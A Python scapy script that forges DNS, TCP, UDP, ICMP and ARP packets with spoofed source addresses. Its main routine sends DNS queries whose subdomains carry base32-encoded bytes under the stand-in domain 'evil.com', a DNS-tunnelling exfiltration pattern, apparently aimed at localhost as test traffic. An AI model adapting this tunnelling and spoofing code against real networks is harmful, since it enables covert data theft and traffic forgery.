from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether, ARP
from scapy.layers.dns import DNS, DNSQR
from scapy.sendrecv import send, sendp
import base64, os

def send_packet(protocol, dst_ip, src_ip=None, src_port=None, dst_port=None,
                src_mac=None, dst_mac=None, flags=None, payload=None, 
                num_packets=1, iface=None):
    
    protocol = protocol.upper()

    packets = []
    
    if protocol == "DNS":
        if payload:
            safe_payload = payload.decode('utf-8').replace(" ", "-")
        
        dns_layer = DNS(rd=1, qd=DNSQR(qname=safe_payload))
        
        # Build the stack: IP / UDP / DNS
        pkt = IP(dst=dst_ip)
        if src_ip:
            pkt.src = src_ip
            
        pkt = pkt / UDP(sport=src_port, dport=dst_port or 53) / dns_layer
        
        # Send it!
        send(pkt, count=num_packets, iface=iface, verbose=True)

    elif protocol == "TCP":
        pkt = IP(dst=dst_ip)
        if src_ip:
            pkt.src = src_ip
        tcp_layer = TCP()
        if src_port:
            tcp_layer.sport = src_port
        if dst_port:
            tcp_layer.dport = dst_port
        if flags:
            tcp_layer.flags = flags
        pkt = pkt / tcp_layer
        packets = [pkt] * num_packets
        send(packets, iface=iface)

    elif protocol == "UDP":
        pkt = IP(dst=dst_ip)
        if src_ip:
            pkt.src = src_ip
        udp_layer = UDP()
        if src_port:
            udp_layer.sport = src_port
        if dst_port:
            udp_layer.dport = dst_port
        
        # ADD THIS: Attach the payload here
        if payload:
            pkt = pkt / udp_layer / payload
        else:
            pkt = pkt / udp_layer
            
            
        packets = [pkt] * num_packets
        send(packets, iface=iface)

    elif protocol == "ICMP":
        pkt = IP(dst=dst_ip)
        if src_ip:
            pkt.src = src_ip
        pkt = pkt / ICMP()
        packets = [pkt] * num_packets
        send(packets, iface=iface)

    elif protocol == "ARP":
        if not dst_ip:
            raise ValueError("ARP requires pdst (destination IP)")
        ether_layer = Ether(dst=dst_mac if dst_mac else "ff:ff:ff:ff:ff:ff")
        arp_layer = ARP(pdst=dst_ip)
        if src_ip:
            arp_layer.psrc = src_ip
        if src_mac:
            arp_layer.hwsrc = src_mac
        pkt = ether_layer / arp_layer
        packets = [pkt] * num_packets
        sendp(packets, iface=iface)

    else:
        raise ValueError(f"Unsupported protocol: {protocol}")
    
def make_tunnel_domain(base_domain="evil.com"):  # already a full domain
    raw = os.urandom(50)
    encoded = base64.b32encode(raw).decode().rstrip("=").lower()
    labels = [encoded[i:i+30] for i in range(0, len(encoded), 30)]
    return (".".join(labels) + "." + base_domain).encode()

def main():
    protocol = "DNS"
    dst_ip = "127.0.0.1"
    src_ip = "192.168.1.2"
    src_port = 12345
    dst_port = 53
    src_mac = "56:1A:7D:3F:4B:6C"
    dst_mac = "41:1A:7D:3F:4B:6C"
    flags = None
    #payload = "4a6f686e20446f6520776173206865726520616e6420646964207468696e6773".encode()
    num_packets = 1
    
    # In main():
    for i in range(10):
        payload = make_tunnel_domain()
        send_packet("DNS", dst_ip, src_ip, src_port, dst_port,
                    src_mac, dst_mac, flags, payload, 1)
    

main()